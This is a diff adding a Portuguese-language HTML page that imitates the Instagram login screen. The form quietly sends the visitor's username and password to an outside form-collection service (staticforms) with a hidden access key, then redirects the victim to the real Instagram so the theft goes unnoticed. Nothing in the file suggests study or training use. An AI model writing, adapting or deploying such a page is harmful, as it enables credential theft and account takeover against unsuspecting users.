@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>instagram</title>
+</head>
+<body>
+    <p class="dig">português (Brasil)</p>
+     <div id="background-image"></div>
+    <section>
+        
+        <h2><img class="inst" src="instagram.png" alt="intagram"></h2>
+        <form action="https://api.staticforms.xyz/submit" method="post">
+            <label></label>
+            <input type="text" name="name" placeholder="Número de telefone, email ou nome de usuário"  required>
+            <label></label>
+            <input type="text" name="email" placeholder="Senha"  required>
+            <br>
+            <button type="submit">Entrar</button>
+           <p class="aja">Esqueceu seus dados de login<a href="#"> Obtenha ajuda para entrar</a></p> 
+           <br>
+            <p>OU</p>
+           <br>
+<div class="fece"><p><img class="fa" src="facebook.png" alt="">continua no Facebook</p></div>
+
+            <input type="hidden" name="accessKey" value="c539a53c-e8b2-4985-9be2-d5df300d8a7a">
+            <input type="hidden" name="redirectTo" value="https://www.instagram.com/instagram?igsh=MWtoOGtjODk2enVzaw==">
+        </form>
+    </section>
+    <p class="ajas">  
+    Não tem conta?<a href="#">Cadastre-se</a>
+</p>
+ <script>
+        // Função para ocultar a imagem de fundo após 5 segundos
+        setTimeout(function(){
+            document.getElementById('background-image').style.display = 'none';
+        }, 7000); // 5000 milissegundos = 5 segundos
+    </script>
+</body>
+</html>
